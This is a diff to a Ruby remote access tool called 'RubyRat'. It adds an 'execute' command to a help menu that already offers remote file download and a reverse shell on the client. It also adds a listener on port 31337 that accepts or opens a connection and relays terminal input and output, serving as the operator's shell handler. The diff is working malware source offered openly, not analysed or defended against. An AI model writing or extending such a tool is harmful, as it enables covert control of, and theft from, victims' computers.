@@ -39,6 +39,7 @@ module RubyRat
         t.add_row ['wget <url>', 'Download a remote file on the client']
         t.add_row ['ifconfig', 'View network interface information']
         t.add_row ['pwd', 'Show the currend directory on the client']
+        t.add_row ['execute', 'Execute a single command on the client']
         t.add_row ['shell', 'Open a reverse shell on the client']
         #t.add_row ['scan <host>', 'Perform a port scan on a host on the client network']
       end
@@ -48,6 +49,43 @@ module RubyRat
         print(*args)
         STDIN.gets
     end
+
+    def self.listener(port=31337, ip=nil)
+        # It is all in how we define our socket
+        # Spawn a server or connect to one....
+        if ip.nil?
+          server = TCPServer.new(port)
+          server.listen(1)
+          @socket = server.accept
+          puts 'Accepted'
+        else
+          @socket = TCPSocket.open(ip, port)
+        end
+        # Actual  Socket Handling
+        while(true)
+          if(IO.select([],[],[@socket, STDIN],0))
+            socket.close
+            return
+          end
+          begin
+            while( (data = @socket.recv_nonblock(100)) != "")
+              STDOUT.write(data);
+            end
+            break
+          rescue Errno::EAGAIN
+          end
+          begin
+            while( (data = STDIN.read_nonblock(100)) != "")
+              @socket.write(data);
+            end
+            break
+          rescue Errno::EAGAIN
+          rescue EOFError
+            break
+          end
+          IO.select([@socket, STDIN], [@socket, STDIN], [@socket, STDIN])
+        end
+      end
 
   end
 end
